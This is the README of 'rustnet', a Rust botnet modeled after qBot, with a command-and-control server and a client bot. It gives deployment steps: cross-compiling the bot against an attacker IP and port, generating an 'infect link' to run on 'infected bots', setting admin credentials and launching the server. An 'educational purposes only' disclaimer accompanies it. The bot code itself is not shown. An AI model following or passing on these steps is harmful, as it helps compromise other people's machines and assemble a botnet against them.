
# rustnet
Rustnet is a botnet system developed in Rust and modeled after qBot. The project includes a server-side application and a client-side bot. The server manages connections from both admin users and bots, allowing admins to execute various commands. The client-side bot connects to the server and awaits instructions. This project is a proof of concept and is intended for educational purposes only.

## Setup
Install rust and cargo:
```curl https://sh.rustup.rs -sSf | sh"```

Configure current shell: ```source "$HOME/.cargo/env"```

Install/Configure dependencies and run cross-compilation: 
```python3 cc7-rust.py client/ <IP_ADDR> <BOT_PORT>```

Copy your infect link after cc7-rust.py completes. This will be the command you run on infected bots.

Add new credential line in `server/admin.txt` in the format of `username:pass`

Build server: ```cd server/ && cargo build --release```

Run server: ```./target/release/server <ADMIN_PORT> <BOT_PORT>```
